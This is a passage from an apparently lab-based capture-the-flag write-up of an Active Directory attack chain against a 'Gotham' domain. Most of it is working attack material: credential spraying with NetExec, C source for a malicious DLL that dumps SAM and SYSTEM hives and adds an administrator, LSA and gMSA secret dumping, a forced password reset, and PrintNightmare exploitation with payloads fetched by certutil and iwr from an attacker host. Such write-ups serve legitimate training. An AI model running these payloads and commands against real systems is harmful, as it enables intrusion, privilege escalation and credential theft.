No interesting outbound ACLs, no privileged groups — `joker` is a pure foothold account. The domain graph offers him nothing directly, so the pivot has to come from somewhere else: the local attack surface of the machines we can touch. (The ACL-based pivots in this lab — a gMSA that controls `harley.quinn`, `harvey.dent` controlling `Backup Operators` — only reveal themselves later, once each clue surfaces and I go back into BloodHound to confirm the edge. That's how this chain actually unfolded: clue first, graph second.)

## 4.2 Protocol Spray — Where Can Joker Go?

BloodHound said joker has no domain edges, but credentials are still credentials — the next move is finding out where they actually *work*. A quick protocol spray across all three machines shows which doors this account opens:

```bash
➜ for proto in smb ldap rdp; \
    do nxc $proto 192.168.56.10-12 -u joker -p '<3batman0893'; \
    echo '---';
done
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\joker:<3batman0893
SMB         192.168.56.12   445    SRV02            [+] GOTHAM.CITY\joker:<3batman0893
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\joker:<3batman0893
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

---

LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (signing:None) (channel binding:No TLS cert)
LDAP        192.168.56.10   389    DC01             [+] GOTHAM.CITY\joker:<3batman0893
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

---

RDP         192.168.56.10   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.11   3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV01) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.12   3389   SRV02            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV02) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.10   3389   DC01             [+] GOTHAM.CITY\joker:<3batman0893
RDP         192.168.56.11   3389   SRV01            [+] GOTHAM.CITY\joker:<3batman0893 (Pwn3d!)
RDP         192.168.56.12   3389   SRV02            [+] GOTHAM.CITY\joker:<3batman0893
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

There it is: **`(Pwn3d!)` on SRV01 over RDP**. Valid credentials plus interactive desktop access — that's a shell, and LDAP only responds from DC01.

## 4.3 RDP | Joker

NetExec can even prove code execution through RDP (it drives the session via clipboard):

```bash
➜ nxc rdp srv01.gotham.city \
    -u joker -p '<3batman0893' \
    -x whoami
[!] Executing remote command via RDP will disconnect the Windows session (not log off) if the targeted user is connected via RDP, do you want to continue ? [Y/n] y
RDP         192.168.56.11   3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV01) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.11   3389   SRV01            [+] GOTHAM.CITY\joker:<3batman0893 (Pwn3d!)
RDP         192.168.56.11   3389   SRV01            [+] Executing command: whoami with delay 5 seconds
RDP         192.168.56.11   3389   SRV01            [+] Waiting for clipboard to be ready...
RDP         192.168.56.11   3389   SRV01            [+] Clipboard is ready, proceeding with command execution
RDP         192.168.56.11   3389   SRV01            gotham\joker

➜ nxc rdp srv01.gotham.city \
    -u joker -p '<3batman0893' \
    --screenshot
RDP         192.168.56.11   3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV01) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.11   3389   SRV01            [+] GOTHAM.CITY\joker:<3batman0893 (Pwn3d!)
RDP         192.168.56.11   3389   SRV01            Screenshot saved /home/deus/.nxc/screenshots/SRV01_192.168.56.11_2026-08-20_183430.png
```

![NetExec RDP screenshot of the joker session on SRV01](/assets/images/barbhack24-gotham-nxc-rdp-joker.png)

Interactive desktop on SRV01 confirmed. Full session:

```bash
➜ xfreerdp3 /u:joker /v:192.168.56.11 /p:'<3batman0893' /dynamic-resolution +clipboard
```

![xfreerdp desktop session as joker on SRV01](/assets/images/barbhack24-gotham-rdp-joker-srv01.png)

User flag captured. Now — privilege escalation.

## 4.4 PrivEsc Recon — the Wayne Folder

Browsing around, `C:\Wayne` stands out — a non-default folder containing a binary:

```powershell
PS C:\> icacls.exe .\Wayne\
.\Wayne\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)
         BUILTIN\Administrators:(OI)(CI)(F)
         BUILTIN\Users:(OI)(CI)(RX,W)

Successfully processed 1 files; Failed processing 0 files

PS C:\> icacls.exe .\Wayne\wayne.exe
.\Wayne\wayne.exe NT AUTHORITY\SYSTEM:(F)
                  BUILTIN\Administrators:(F)
                  BUILTIN\Users:(RX)

Successfully processed 1 files; Failed processing 0 files

PS C:\> .\Wayne\wayne.exe
LoadLibrary() KO - Error: 126
```

Reading the ACLs carefully:

* The **binary itself** (`wayne.exe`) is locked down — `BUILTIN\Users` only has `(RX)` read/execute. No binary replacement possible.
* The **folder**, however, grants `BUILTIN\Users` `(RX,W)` with container-inherit `(CI)` — users can create files inside `C:\Wayne`.

And the error message is a gift: **`LoadLibrary() KO - Error: 126`**. Error 126 is `ERROR_MOD_NOT_FOUND` — the program tried to load a DLL at runtime and couldn't find it. A writable directory + a binary that loads a missing library = textbook **DLL hijacking** setup.

## 4.5 Confirming the Missing DLL

To see exactly what `wayne.exe` wants, grab a copy for static/dynamic analysis. The CleanSlate share doubles nicely as a file-transfer channel — copy the binary into it from the RDP session, then pull it back from the attacker box:

```powershell
PS C:\> copy C:\Wayne\wayne.exe \\SRV01\CleanSlate\
```

```bash
➜ nxc smb srv01.gotham.city \
    -u 'guest' -p '' \
    --share 'CleanSlate' \
    --get-file wayne.exe wayne.exe
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\guest:
SMB         192.168.56.11   445    SRV01            [*] Copying "wayne.exe" to "wayne.exe"
SMB         192.168.56.11   445    SRV01            [+] File "wayne.exe" was downloaded to "wayne.exe"

➜ file wayne.exe
wayne.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 7 sections
```

Running it under Procmon on the attacker machine (same methodology as the CleanSlate analysis) shows the exact failure: `wayne.exe` attempts to load **`alfred.dll`** — a name that doesn't exist anywhere on the filesystem. Classic missing-DLL hijack opportunity:

![Procmon showing wayne.exe failing to load alfred.dll](/assets/images/barbhack24-gotham-procmon-alfred-dll.png)

Next question: *what privileges will our DLL inherit?* Check the service that runs this binary:

```powershell
PS C:\> Get-WmiObject Win32_Service -Filter "Name='wayneservice'" | Select-Object Name, StartName, State, Status | Format-Table -AutoSize

Name         StartName   State   Status
----         ---------   -----   ------
WayneService LocalSystem Stopped OK
```

**`LocalSystem`** — the service's DLLs execute as SYSTEM, so whatever we plant in `C:\Wayne` runs with the highest privileges Windows has. The plan: craft an `alfred.dll` that does our post-exploitation work, drop it into the writable directory, start the service, and let SYSTEM do the rest.

## 4.6 Exploitation | DLL Hijacking

The malicious DLL — on load it saves the SAM and SYSTEM hives to `C:\ProgramData` (world-readable staging) and adds `joker` to the local Administrators group:

```c
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet")

int main(void);

typedef void (*fp)(void);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        main();
        break;
    }
    return TRUE;
}

int main()
{
    // 1. Backup registry
    WinExec("cmd.exe /c reg save hklm\\system C:\\programdata\\system", SW_HIDE);
    WinExec("cmd.exe /c reg save hklm\\sam C:\\programdata\\sam", SW_HIDE);

    // 2. Add "joker" to the local Administrators group
    WinExec("cmd.exe /c net localgroup administrators joker /add", SW_HIDE);
    return 0;
}
```

Compiling from Linux with MinGW:

```bash
➜ x86_64-w64-mingw32-gcc -static -shared pwn.c -o alfred.dll -lwininet

➜ file alfred.dll
alfred.dll: PE32+ executable for MS Windows 5.02 (DLL), x86-64, 20 sections
```

Upload through the guest-writable CleanSlate share — the same share that gave us the foothold now serves as the payload delivery mechanism:

```bash
➜ nxc smb srv01.gotham.city \
    -u 'guest' -p '' \
    --share 'CleanSlate' \
    --put-file alfred.dll alfred.dll
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\guest:
SMB         192.168.56.11   445    SRV01            [*] Copying alfred.dll to alfred.dll
SMB         192.168.56.11   445    SRV01            [+] Created file alfred.dll on \\CleanSlate\alfred.dll
```

Then move it from the share into the service directory and trigger the load:

```powershell
PS C:\> copy \\SRV01\CleanSlate\alfred.dll C:\Wayne\

PS C:\Wayne> net start WayneService
The service is not responding to the control function.

More help is available by typing NET HELPMSG 2186.
```

The service "fails" to start — expected, since our DLL has no real service entry point — but the damage is done: `DLL_PROCESS_ATTACH` already ran our code as SYSTEM. Verify:

```powershell
PS C:\Wayne> hostname
SRV01

PS C:\Wayne> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
GOTHAM\Domain Admins
GOTHAM\joker
The command completed successfully.
```

**`GOTHAM\joker` is now a local administrator on SRV01.** And the registry backups our DLL dropped are sitting in `C:\ProgramData`:

![SAM and SYSTEM hive dumps staged in C:\ProgramData](/assets/images/barbhack24-gotham-sam-system-dumps.png)

Pull them back through the share:

```bash
➜ nxc smb srv01.gotham.city \
    -u 'guest' -p '' \
    --get-file sam sam --share 'CleanSlate'
SMB         192.168.56.11   445    SRV01            [*] Copying "sam" to "sam"
SMB         192.168.56.11   445    SRV01            [+] File "sam" was downloaded to "sam"

➜ nxc smb srv01.gotham.city \
    -u 'guest' -p '' \
    --get-file system system --share 'CleanSlate'
SMB         192.168.56.11   445    SRV01            [*] Copying "system" to "system"
SMB         192.168.56.11   445    SRV01            [+] File "system" was downloaded to "system"
```

---

# 5. SRV01 | Post-Exploitation

## 5.1 Dumping SAM

With local admin on SRV01, the hive backups our DLL staged can now be turned into hashes. `SYSTEM` holds the **bootkey**, SAM holds the **encrypted local account hashes** — together they decrypt:

```bash
➜ secretsdump.py -sam sam -system system local
Impacket v0.14.0.dev0+202****0819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x6e2b37c67b33becaac6ed6639856a7c6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f659535a42adfdbc297197e20073cf0b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2e8a52cc71103d91af201e4737c2effc:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
[*] Cleaning up...
```

Local hashes in hand — but here's the honest assessment: **they're not useful for this lab.** The local `Administrator` hash only authenticates against SRV01 itself — and even there, only with `--local-auth`. Let's prove the negative properly instead of assuming. Spraying the hash across all three machines as a *domain* identity (`GOTHAM.CITY\administrator`):

```bash
➜ for proto in smb ldap rdp; \
    do nxc $proto 192.168.56.10-12 -u administrator -H 'f659535a42adfdbc297197e20073cf0b'; \
    echo '---';
done
SMB         192.168.56.12   445    SRV02            [-] GOTHAM.CITY\administrator:f659535a42adfdbc297197e20073cf0b STATUS_LOGON_FAILURE
SMB         192.168.56.11   445    SRV01            [-] GOTHAM.CITY\administrator:f659535a42adfdbc297197e20073cf0b STATUS_LOGON_FAILURE
SMB         192.168.56.10   445    DC01             [-] GOTHAM.CITY\administrator:f659535a42adfdbc297197e20073cf0b STATUS_LOGON_FAILURE
---
LDAP        192.168.56.10   389    DC01             [-] GOTHAM.CITY\administrator:f659535a42adfdbc297197e20073cf0b
---
RDP         192.168.56.10   3389   DC01             [-] GOTHAM.CITY\administrator:f659535a42adfdbc297197e20073cf0b (STATUS_LOGON_FAILURE)
RDP         192.168.56.11   3389   SRV01            [-] GOTHAM.CITY\administrator:f659535a42adfdbc297197e20073cf0b (STATUS_LOGON_FAILURE)
RDP         192.168.56.12   445    SRV02            [-] GOTHAM.CITY\administrator:f659535a42adfdbc297197e20073cf0b (STATUS_LOGON_FAILURE)
```

`STATUS_LOGON_FAILURE` everywhere. The reason is simple: that hash belongs to **SRV01's local** Administrator, not the domain one. Local accounts live in the machine's SAM; domain accounts live in `NTDS.dit` on the DC. They're completely different accounts that happen to share a name — spraying a local hash as a domain credential fails by design, unless every machine coincidentally reuses the same local password (the classic reason pass-the-hash *does* work across fleets). Here it doesn't.

## 5.2 Using the Hash — Local Auth on SRV01

The hash *is* valid, though — just against its own machine. The trick is `--local-auth`, which tells NetExec to authenticate against the target's SAM instead of the domain:

```bash
➜ for proto in smb rdp; \
    do nxc $proto srv01.gotham.city -u administrator -H 'f659535a42adfdbc297197e20073cf0b' --local-auth; \
    echo '---';
done
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:SRV01) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] SRV01\administrator:f659535a42adfdbc297197e20073cf0b (Pwn3d!)
---
RDP         192.168.56.11   3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV01) (domain:SRV01) (nla:True)
RDP         192.168.56.11   3389   SRV01            [+] SRV01\administrator:f659535a42adfdbc297197e20073cf0b (Pwn3d!)
```

`(Pwn3d!)` on both SMB and RDP — full local admin over SRV01 with nothing but a hash. Note what the banner now says: `(domain:SRV01)` instead of `(domain:GOTHAM.CITY)`. NetExec is telling us we're talking to the machine's own account database.

So which identity do we run post-exploitation with? Both work for dumping this box:

* **Local admin** (`--local-auth`) — proves the hash end-to-end, but it's a machine-local identity: useless for anything that touches the domain (LDAP queries, Kerberos, cross-machine access).
* **joker** (`GOTHAM.CITY\joker`) — same privileges on SRV01 (he was added to the local Administrators group), *plus* he's a real domain account that can talk to DC01 later.

We'll use joker from here on — not because the admin hash is weak, but because the next steps all need domain context, and carrying one credential set through the chain keeps it clean.

## 5.3 LSA Secrets — Where the Real Loot Is

> **What are LSA secrets?** The Local Security Authority (LSA) protects a special registry area (`HKLM\SECURITY`) where Windows stores machine-wide secrets: service account passwords (`_SC_*` entries), the machine account's own credential (`$MACHINE.ACC`), DPAPI keys, cached domain logons, and auto-logon passwords. Anything a service needs to *be* or *reach* without a human typing a password tends to end up here. For an attacker with local admin, it's frequently the highest-value loot on a box — service accounts often have more domain reach than any interactive user, and plaintext passwords aren't uncommon. NetExec dumps it with `--lsa`:

```bash
➜ nxc smb srv01.gotham.city \
    -u joker -p '<3batman0893' \
    --lsa
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\joker:<3batman0893 (Pwn3d!)
SMB         192.168.56.11   445    SRV01            [*] Dumping LSA secrets
SMB         192.168.56.11   445    SRV01            GOTHAM.CITY/Administrator:$DCC2$10240#Administrator#39485ed3512c727dd30b8f5dccd81131: (2026-08-16 14:29:36)
SMB         192.168.56.11   445    SRV01            GOTHAM.CITY/joker:$DCC2$10240#joker#e7d14d706a6a8a40939f0b5ed6fa4db1: (2026-08-20 13:11:06)
SMB         192.168.56.11   445    SRV01            GOTHAM\SRV01$:aes256-cts-hmac-sha1-96:3dd3b43642956a2cb2cd0461e37899ae024fefdb9eeb135b343abb725dc90d0f
SMB         192.168.56.11   445    SRV01            GOTHAM\SRV01$:aad3b435b51404eeaad3b435b51404ee:55541228e075452d2a73caf0eef04e43:::
SMB         192.168.56.11   445    SRV01            dpapi_machinekey:0x47c404dc1b78c67aa0a192fe6bdeb994ba42269e
dpapi_userkey:0x5fe3af3565ca19b54a4904706897ded0657d525b
SMB         192.168.56.11   445    SRV01            _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c:b0daf9c31ff7a12a7057f5202b95a2d07d7d98d88ba1958b58cd8b48e12a84d8869c14c45203bc9925fcbc2f8873de6d4d887adb7322080244ec8a2fb40ea86351254fc98523a7c04c3f144f4a1310165ccd3ff16d854218e508054c739a71ab010c64aa49eff7324b1c7e813b58199b3d9ef114efa50a2fca054348b878e3980fedc970ba57ed9723a1a685ddf909f5a6dea8881c5e408110c25dd479a678eabedd9f01e1c1edbf9391b34728f6290f09f14b5ab0dc26975e2b923e23e8bb934e5022748e13f8cedbc5c8b11811b22aba3884c28e916f3fb9f0076e2b9df1673cc442bcd7b9c3ea8b88336df90f7b70
SMB         192.168.56.11   445    SRV01            _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c:01000000220100001000000012011a019c1f1648cb0939dc3a0c8ac61d6f2f43f9b8c45b8107a27abe922f09d68622d672359d5d12311b848642fc44ebc70c23cfd34f0df8eb8e1cc836df5046ae8dc725444f2dbbfd68e0dc0b17915c12b73a9e33a4f7e6e048ea3037204eae3d95d207e3c42f863e8cbfef60cf39d0d6dd5255dc46b27eed28149b52de2f9b61b6abd921eb9b89da2768bb90ec77d40450f435af15b467a62a56b4093fe582d978b3099ec98eb847509022c18dcea615bca3d4e2b6092eb67e2a45544d9ea549d196f0b3c64d257de953b24bc6677f9fdcf312f59031dd375a2daf4dbbb13bd50f8c15aeaa984a7c46139d7b2ea9323c505d95c44325dafe697ba88cefb467cfb6c500006ae43c9d711700006a866cea70170000
SMB         192.168.56.11   445    SRV01            GMSA ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c NTLM: 88bcb4c9943b4c323896d0f39eca640a
SMB         192.168.56.11   445    SRV01            [+] Dumped 10 LSA secrets to /home/deus/.nxc/logs/lsa/SRV01_192.168.56.11_2026-08-20_212453.secrets and /home/deus/.nxc/logs/lsa/SRV01_192.168.56.11_2026-08-20_212453.cached
```

Most of this is machine housekeeping — DPAPI keys, Kerberos keys for `SRV01$`, cached credentials for joker himself. But two entries stand out:

* `_SC_GMSA_{...}_850d620d...` — a **gMSA password blob**, encrypted by the machine for its own use
* `GMSA ID: 850d620d... NTLM: 88bcb4c9943b4c323896d0f39eca640a` — and NetExec has already decrypted it for us

That ID string is the gMSA account's **objectGUID-based identifier** — a unique value we can take to the domain controller to resolve which account it belongs to. We saw a `gmsa-robin$` account during the RID brute; if this ID maps to it, we just harvested a managed service account's password without ever touching its password policy.

## 5.4 Resolving the gMSA — `gmsa-robin$`

A quick detour on what a **gMSA** actually is: a *Group Managed Service Account* is an AD object whose password is a 240-byte random secret that **no human ever knows**. It's automatically rotated by the KDC on a schedule, and member machines that are allowed to use it read the current value from AD (encrypted with a key derived from the machine account). No password expiry pain, no password reuse — great for defenders. But the flip side: whatever holds the gMSA's current password blob *is* the credential, and we just dumped it out of SRV01's LSA.

NetExec can resolve the ID to an account name over LDAP:

```bash
➜ nxc ldap dc01.gotham.city \
    -u joker -p '<3batman0893' \
    --gmsa-convert-id 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c
LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (signing:None) (channel binding:No TLS cert)
LDAP        192.168.56.10   389    DC01             [+] GOTHAM.CITY\joker:<3batman0893
LDAP        192.168.56.10   389    DC01             Account: gmsa-robin$          ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c
```

Confirmed: the ID maps to **`gmsa-robin$`** — the account that caught my eye back in the RID brute. We now hold its NTLM hash (`88bcb4c9943b4c323896d0f39eca640a`) and can authenticate as it directly.

## 5.5 BloodHound — What Does Robin Control?

Fresh account in hand means it's time to check the graph again. Pulling up `GMSA-ROBIN$` in BloodHound:

![BloodHound - GMSA-ROBIN$ has GenericAll over harley.quinn](/assets/images/barbhack24-gotham-bh-gmsa-quinn.png)

**`GMSA-ROBIN$@GOTHAM.CITY`** *has* **`GenericAll`** *over* **`HARLEY.QUINN@GOTHAM.CITY`**

`GenericAll` is the full-control ACE: it grants the right to change the target's password, reset SPNs, modify group membership, or hand out delegation rights — everything short of deleting the object. The cleanest immediate win is a **targeted Kerberos password reset**: set `harley.quinn`'s password to something we know, then authenticate as her. No cracking involved — the ACE does all the work.

## 5.6 Resetting harley.quinn's Password

NetExec has a `change-password` module that does this in one shot, authenticating as `gmsa-robin$` with its hash:

```bash
➜ nxc smb dc01.gotham.city \
    -u 'gmsa-robin$' -H '88bcb4c9943b4c323896d0f39eca640a' \
    -M change-password -o USER='harley.quinn' NEWPASS='SecretMyth123!'
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\gmsa-robin$:88bcb4c9943b4c323896d0f39eca640a
CHANGE-P... 192.168.56.10   445    DC01             [+] Successfully changed password for harley.quinn
```

**`HARLEY.QUINN` is now fully compromised** with a password of our choosing (`SecretMyth123!`). Let's pivot to **`SRV02`**.

---

# 6. SRV02 | Exploitation

## 6.1 Harley Quinn | Enumeration

Same drill as with joker — new creds, find out where they work:

```bash
➜ nxc rdp 192.168.56.10-12 \
    -u harley.quinn -p 'SecretMyth123!'
RDP         192.168.56.10      3389   DC01             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.11      3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV01) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.12      3389   SRV02            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV02) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.10      3389   DC01             [+] GOTHAM.CITY\harley.quinn:SecretMyth123!
RDP         192.168.56.11      3389   SRV01            [+] GOTHAM.CITY\harley.quinn:SecretMyth123!
RDP         192.168.56.12      3389   SRV02            [+] GOTHAM.CITY\harley.quinn:SecretMyth123! (Pwn3d!)
```

`(Pwn3d!)` on **SRV02**. In we go:

```bash
➜ xfreerdp3 /u:harley.quinn /v:192.168.56.12 /p:'SecretMyth123!' /dynamic-resolution +clipboard
```

![xfreerdp desktop session as harley.quinn on SRV02](/assets/images/barbhack24-gotham-rdp-quinn-srv02.png)

## 6.2 PrivEsc Recon — PrivescCheck

Standard user context again, so it's privilege escalation time. Same tool as before — [PrivescCheck](https://github.com/itm4n/PrivescCheck) by itm4n automates the boring checks and produces an HTML report that's far easier to read than raw output:

```powershell
PS > powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
```

98 checks later, the summary — organised by MITRE ATT&CK tactic:

```
 TA0004 - Privilege Escalation
 - Applications - Root Folder Permissions ➜ Low
 - Configuration - Driver Co-Installers ➜ Low
 - Configuration - Point and Print ➜ High          ← there it is
 - Services - Registry Permissions (Extended) ➜ Medium
 - Updates - Update History ➜ Medium
...[snip]...
 TA0006 - Credential Access
 - Hardening - Credential Guard ➜ Low
 - Hardening - LSA Protection ➜ Low
 TA0008 - Lateral Movement
 - Hardening - LAPS ➜ Medium
 - Hardening - User Account Control (UAC) ➜ Low
```

Almost everything comes back `Low` — the hardening baseline is decent — but one line stands out at **`High`**: **`Configuration - Point and Print`**. Digging into that finding in the report shows exactly which registry values are to blame:

```
Policy      : Limits print driver installation to Administrators
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : RestrictDriverInstallationToAdministrators
Data        : 0
Default     : 1
Expected    : <null|1>
Description : Installing printer drivers does not require administrator privileges.

Policy      : Point and Print Restrictions > NoWarningNoElevationOnInstall
Value       : NoWarningNoElevationOnInstall
Data        : 1          (Default: 0)
Description : Do not show warning or elevation prompt. Note: this setting
              reintroduces the PrintNightmare LPE vulnerability, even if the
              settings 'InForest' and/or 'TrustedServers' are configured.
```

Two misconfigurations, stacked: `RestrictDriverInstallationToAdministrators = 0` lets any user install printer drivers, and `NoWarningNoElevationOnInstall = 1` disables the warning/elevation prompt while doing it — PrivescCheck's own description notes this setting *"reintroduces the PrintNightmare LPE vulnerability"*. Better known by its CVE names: **PrintNightmare**.

## 6.3 PrintNightmare

itm4n's [original research](https://itm4n.github.io/printnightmare-exploitation/) is still the best explanation of the mechanism; 0xdf wrote a good practical [walkthrough](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html) too. The short version:

* The **Print Spooler** service runs as `SYSTEM` on virtually every Windows box.
* The MS-RPRN protocol lets remote users add printer drivers via `RpcAddPrinterDriverEx`.
* Pre-patch, a non-admin could point that call at an arbitrary DLL (`CVE-2021-1675` / `CVE-2021-34527`) — and the spooler would load it as SYSTEM.

NetExec confirms SRV02 is primed for it: the spooler is running and the `printnightmare` module flags it vulnerable. Along the way I also chased the relay/AD CS leads that `enum_cve` and `coerce_plus` surfaced — coercion worked but the captured `SRV02$` hash wouldn't crack, and the AD CS checks died on a missing LDAPS endpoint. Both detours are documented in [Appendix B](#appendix-b-printnightmare--detours--error-reference); here's the path that worked.

### 6.3.1 The Payload

The same DLL serves every attempt — create the `myth` user and add it to the local Administrators group:

```c
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet")

int main(void);

typedef void (*fp)(void);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        main();
        break;
    }
    return TRUE;
}

int main()
{
    // 1. Change the password for user "myth"
    WinExec("cmd.exe /c net user myth SecretMyth123! /add", SW_HIDE);

    // 2. Add "myth" to the local Administrators group
    WinExec("cmd.exe /c net localgroup administrators myth /add", SW_HIDE);
    return 0;
}
```

```bash
➜ x86_64-w64-mingw32-gcc -static -shared pwn.c -o myth.dll -lwininet
```

### 6.3.2 Two Failures, Then the Win

The remote attempt — DLL hosted on our attacker SMB share:

```bash
➜ printnightmare.py \
    -u harley.quinn -p 'SecretMyth123!' -d gotham.city \
    -dll myth.dll 192.168.56.12
...[snip]...
[-] Exploit returned: RPRN SessionError: unknown error code: 0x8001011b
```

Adapting — stage the same DLL locally (`certutil` works fine as a downloader) and retry with SharpPrintNightmare:

```powershell
PS C:\programdata> certutil -urlcache -f -split http://192.168.10.131/myth.dll myth.dll
PS C:\programdata> .\SharpPrintNightmare.exe \programdata\myth.dll
[*] Executing \programdata\myth.dll
[*] Try 1...
[*] Stage 0: 87
```

Two dead ends: `0x8001011b` (`RPC_E_ACCESS_DENIED` — post-2021 hardening blocks driver loads from UNC paths) and `87` (`ERROR_INVALID_PARAMETER` — this older PoC builds the driver-add call in a way patched builds reject). Both errors are fully dissected in [Appendix B](#appendix-b-printnightmare--detours--error-reference) — what each proves, and how to read which *layer* rejected you.

Both point the same direction: use a maintained implementation of the **local** LPE variant (`CVE-2021-1675`) — exactly what Invoke-Nightmare is.

### 6.3.3 Local Exploitation — Invoke-Nightmare

[Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675) (Caleb Stewart & John Hammond) wraps CVE-2021-1675 in a tidy PowerShell function — it registers a fake printer driver pointing at a payload DLL in the local DriverStore path, and cleans up after itself:

```powershell
# Fetch the script onto the target
PS C:\programdata> iwr http://192.168.10.131/CVE-2021-1675.ps1 -outfile CVE-2021-1675.ps1

# Run it
PS C:\programdata> Import-Module .\CVE-2021-1675.ps1

PS C:\programdata> Invoke-Nightmare -NewUser 'myth' -NewPassword 'SecretMyth123!'
[+] created payload at C:\Users\harley.quinn\AppData\Local\Temp\2\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_075615bee6f80a8d\Amd64\mxdwdrv.dll"
[+] added user myth as local administrator
[+] deleting payload from C:\Users\harley.quinn\AppData\Local\Temp\2\nightmare.dll

PS C:\programdata> net user myth
User name                    myth
Full Name                    myth
...
Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

The account **`myth`** now exists as a local administrator on SRV02. Verify from the attacker box:

```bash
➜ nxc smb 192.168.56.10-12 \
    -u 'myth' -p 'SecretMyth123!' --local-auth
SMB         192.168.56.11      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:SRV01) (signing:False) (SMBv1:None)
SMB         192.168.56.10      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:None) (Null Auth:True)
